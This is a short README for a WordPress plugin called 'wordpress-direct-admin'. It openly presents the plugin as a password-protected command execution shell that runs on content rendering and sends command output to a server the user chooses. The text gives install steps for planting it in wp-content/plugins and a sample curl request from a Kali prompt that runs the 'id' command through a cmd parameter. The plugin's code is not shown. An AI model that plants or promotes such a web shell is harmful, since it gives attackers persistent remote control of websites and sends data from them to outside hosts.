wordpress-direct-admin
===============

A simple password protected command execution shell that fires on the rendering of content and sends the output to a server of your choice.

Install
=======
To install the shell, we are assuming you have administrative access to the Wordpress install and can install plugins.
Upload and extract the zip archive within the wp-content/plugins directory.
Remember to change the password to something unique to you.
Remember to set the server IP address to something you own.

Sample Usage
============
```
root@kali:~# curl -v "http://wordpresssite/?cmd=id&pass=<password>"
```
